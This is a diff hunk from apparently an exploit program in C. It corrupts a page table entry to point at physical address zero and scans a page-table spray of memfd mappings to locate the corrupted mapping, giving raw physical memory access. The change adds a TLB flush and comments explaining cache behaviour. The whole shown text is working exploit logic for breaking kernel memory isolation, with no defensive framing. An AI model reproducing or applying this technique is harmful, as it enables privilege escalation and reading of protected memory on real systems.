@@ -142,31 +142,30 @@ int main()
 	uint64_t orig_pte = *glitched_pte;
 	*glitched_pte = *glitched_pte & 0x8000000000000fff; // point it at address zero (arbitrary - make sure physmem 0 is readable on your hardware I guess?)
 
-	//uint64_t foo = 0;
 	uint8_t *glitched_map = NULL;
 
-	// loop twice to make sure the tlb/cache gets busted (may be unnecessary)
-	//for (int k=0; k<2; k++) {
-		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
-			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
-				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
-				//*glitched_pte; // read to keep it in cache?
-				if (ptr == glitched_pte) continue;
-				if (*ptr == *glitched_pte) {
-					printf("[-] That's not supposed to happen\n");
-					return -1;
-				}
-				if (*ptr != 0x4141414141414141) {
-					printf("Found it!\n");
-					printf("%p\n", (void*)ptr);
+	flush_tlb();
 
-					hexdump(ptr, 128);
+	for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
+		for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
+			uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
+			//*glitched_pte; // read to keep it in cache?
+			if (ptr == glitched_pte) continue;
+			if (*ptr == *glitched_pte) { // this check has a dual purpose of keeping glitched_pte in cache
+				// this happens when the write to *glitched_pte just went through to the memfd pages - idk why it sometimes happens - maybe it falls out of TLB?
+				printf("[-] That's not supposed to happen\n");
+				return -1;
+			}
+			if (*ptr != 0x4141414141414141) {
+				printf("Found it!\n");
+				printf("%p\n", (void*)ptr);
 
-					glitched_map = (uint8_t*)ptr;
-				}
+				hexdump(ptr, 128);
+
+				glitched_map = (uint8_t*)ptr;
 			}
 		}
-	//}
+	}
 
 	if (glitched_map == NULL) {
 		printf("[-] Failed to find corresponding mapping :(\n");
